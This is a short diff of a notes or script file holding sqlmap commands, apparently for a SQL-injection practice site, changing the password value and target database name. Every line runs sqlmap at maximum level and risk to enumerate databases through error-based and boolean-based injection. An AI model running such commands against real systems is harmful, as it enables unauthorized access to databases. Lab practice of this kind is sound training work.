@@ -1,2 +1,2 @@
-sqlmap -u "http://sqli3.adriaan.haxx.be/?username=test&password=mlqsdkjfqmlskdfj" --level 5 --risk 3 --dbs --technique e
-sqlmap -u "http://sqli3.adriaan.haxx.be/?username=test&password=mlqsdkjfqmlskdfj" --level 5 --risk 3 --D sqli3  --technique b
+sqlmap -u "http://sqli3.adriaan.haxx.be/?username=test&password=pass" --level 5 --risk 3 --dbs --technique e
+sqlmap -u "http://sqli3.adriaan.haxx.be/?username=test&password=pass" --level 5 --risk 3 --D sqli2  --technique b
